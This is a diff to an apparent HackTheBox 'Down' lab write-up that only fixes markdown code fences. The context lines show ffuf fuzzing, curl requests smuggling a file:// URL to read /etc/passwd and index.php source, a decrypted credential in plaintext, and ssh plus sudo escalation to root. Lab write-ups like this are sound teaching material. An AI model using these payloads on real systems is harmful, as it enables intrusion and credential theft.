@@ -39,7 +39,7 @@ Have the server send a request to your host and watch it with `nc` or Wireshark.
 
 ```
 ffuf -u 'http://10.129.234.87/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak -mc 200,301,302
-```bash
+```
 
 Sniper attack in burp intruder with /usr/share/seclists/Fuzzing/special-chars.txt
 ![20251122020203.png](/assets/img/htb-writeups/Pasted image 20251122020203.png)
@@ -52,7 +52,7 @@ curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///etc/passwd"
 Read source code:
 ```bash
 curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///var/www/html/index.php"
-```bash
+```
 
 RCE payload:
 update GET to POST
@@ -105,7 +105,7 @@ ares@legion:~/HackTheBox/Down$ python3 decrypt.py
 flower
 ['pswm\taleks\tflower', 'aleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E']
 [SUCCESS] Found with password: flower
-```bash
+```
 ```
 ssh aleks@10.129.234.87
 aleks@down:~$ sudo -l
@@ -120,5 +120,5 @@ sudo su
 root@down:~# id
 uid=0(root) gid=0(root) groups=0(root)
 
-```bash
+```
 
